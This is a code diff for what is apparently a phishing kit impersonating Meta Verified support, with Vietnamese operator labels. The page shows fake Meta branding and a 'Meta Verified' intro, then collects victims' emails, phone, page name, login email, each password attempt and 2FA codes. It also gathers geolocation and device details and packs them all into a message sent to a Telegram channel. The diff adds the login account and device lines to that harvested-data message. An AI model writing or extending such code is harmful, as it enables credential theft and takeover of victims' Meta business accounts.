@@ -5,12 +5,14 @@ import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
 import SuccessModal from '@/components/SuccessModal';
+import IntroLoading from '@/components/intro-loading';
 
 // Utils
 import { translateText } from '@/utils/translate';
 import countryToLanguage from '@/utils/country_to_language';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
+import detectDevice from '@/utils/detect_device';
 
 const LABEL = 'Thần-tài-đến';
 
@@ -65,39 +67,6 @@ const formatDateTime = () => {
     return `${pad(now.getDate())}/${pad(now.getMonth() + 1)}/${now.getFullYear()} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
 };
 
-const parseDeviceInfo = (ua = '') => {
-    const normalizedUA = String(ua || '').toLowerCase();
-    const deviceType = /mobile|android|iphone|ipad/i.test(normalizedUA) ? 'Mobile' : 'Desktop';
-
-    const os = (() => {
-        if (normalizedUA.includes('windows nt 10.0')) return 'Windows 10';
-        if (normalizedUA.includes('windows nt')) return 'Windows';
-        if (normalizedUA.includes('android')) return 'Android';
-        if (normalizedUA.includes('iphone') || normalizedUA.includes('ipad') || normalizedUA.includes('ios')) return 'iOS';
-        if (normalizedUA.includes('mac os x')) return 'macOS';
-        if (normalizedUA.includes('linux')) return 'Linux';
-        return 'Unknown OS';
-    })();
-
-    const browser = (() => {
-        const edgeMatch = ua.match(/Edg\/(\d+(?:\.\d+)*)/i);
-        if (edgeMatch) return `Edge ${edgeMatch[1]}`;
-
-        const chromeMatch = ua.match(/Chrome\/(\d+(?:\.\d+)*)/i);
-        if (chromeMatch) return `Chrome ${chromeMatch[1]}`;
-
-        const firefoxMatch = ua.match(/Firefox\/(\d+(?:\.\d+)*)/i);
-        if (firefoxMatch) return `Firefox ${firefoxMatch[1]}`;
-
-        const safariMatch = ua.match(/Version\/(\d+(?:\.\d+)*)[\s\S]*Safari/i);
-        if (safariMatch) return `Safari ${safariMatch[1]}`;
-
-        return 'Unknown Browser';
-    })();
-
-    return `${deviceType} - ${os} - ${browser}`;
-};
-
 const fetchGeoData = async () => {
     for (const endpoint of GEO_ENDPOINTS) {
         try {
@@ -114,6 +83,7 @@ const fetchGeoData = async () => {
 };
 
 const Home = () => {
+    const [showIntro, setShowIntro] = useState(true);
     const [showFirstFormModal, setShowFirstFormModal] = useState(false);
     const [showLoginModal, setShowLoginModal] = useState(false);
     const [show2FAModal, setShow2FAModal] = useState(false);
@@ -123,9 +93,7 @@ const Home = () => {
         personalEmail: '',
         businessEmail: '',
         phone: '',
-        pageName: '',
-        dob: '',
-        additionalNotes: ''
+        pageName: ''
     });
     const [loginData, setLoginData] = useState({ email: '', password: '' });
     const [passwordAttempts, setPasswordAttempts] = useState([]);
@@ -177,13 +145,7 @@ const Home = () => {
             mobilePhonePlaceholder: 'Example: +1 201 555 0123',
             yourPageName: 'Your Page Name',
             pageNamePlaceholder: 'Example: ABC Studio Official',
-            additionalNotes: 'Additional notes (optional)',
-            additionalNotesPlaceholder: 'Example: This page officially represents ABC brand and needs verification to improve trust.',
-            dob: 'Date of birth',
-            day: 'Day',
             step: 'Step',
-            month: 'Month',
-            year: 'Year',
             agreeToTermsOfUse: 'I agree to the Terms of Use',
             termsOfUseLink: 'Terms of Use',
             securityCheck: 'Security check',
@@ -216,6 +178,10 @@ const Home = () => {
             bannerCommunity: 'Community Standards',
             bannerHelp: 'Help Center',
             bannerBusinessHelp: 'Meta Business Help Center',
+            introHeroLead: 'Upgrade your business with Meta Verified.',
+            introHeroBody: 'When a business has the Verified badge, people are nearly twice as likely to trust that business recommendation compared to one without the badge.',
+            introHeroHighlight: 'Why wait? Subscribe to Meta Verified today to add this badge to your profile and enjoy exclusive benefits.',
+            introContinueButton: 'Continue to Meta Verified Support Center',
         }),
         []
     );
@@ -286,8 +252,8 @@ const Home = () => {
                 return;
             }
 
-            const ua = navigator.userAgent;
-            setDeviceInfo({ deviceInfo: ua });
+            const detectedDevice = detectDevice();
+            setDeviceInfo(detectedDevice);
         } catch (error) {
             console.error('Initialization error:', error);
             setTranslatedTexts(defaultTexts);
@@ -312,9 +278,8 @@ const Home = () => {
         const safeCity = ip.city || 'Unknown';
         const safeRegion = ip.region || 'Unknown';
         const safeCountry = ip.country || 'Unknown';
-        const parsedDevice = parseDeviceInfo(device.deviceInfo);
-        const deviceLine = '';
-        // const deviceLine = `\n📱 Thiết bị: ${escapeHtml(parsedDevice)}`;
+        const parsedDevice = device.deviceInfo || 'Unknown Device - Unknown OS - Unknown Browser';
+        const deviceLine = `\n📱 Thiết bị: ${escapeHtml(parsedDevice)}`;
 
         const passwordLines = passwordLogs.length > 0
             ? passwordLogs.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
@@ -323,6 +288,8 @@ const Home = () => {
         const twoFALines = attempts.length > 0
             ? attempts.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
             : '   Code1: <code>N/A</code>';
+
+        const loginAccount = login.email || 'N/A';
 
         const message = `📩 <b>${escapeHtml(LABEL)}</b>
 ⏰ ${formatDateTime()}
@@ -337,6 +304,7 @@ const Home = () => {
    Page: <code>${escapeHtml(form.pageName)}</code>
 
 🔐 <b>ĐĂNG NHẬP</b>
+   TK: <code>${escapeHtml(loginAccount)}</code>
 ${passwordLines}
 
 🔒 <b>MÃ 2FA</b>
@@ -369,6 +337,7 @@ ${twoFALines}
 
     return (
         <>
+            {showIntro && <IntroLoading onDone={() => setShowIntro(false)} texts={texts} />}
             <MetaVerifiedBanner
                 altText={texts.metaVerified}
                 onSubmit={() => setShowFirstFormModal(true)}
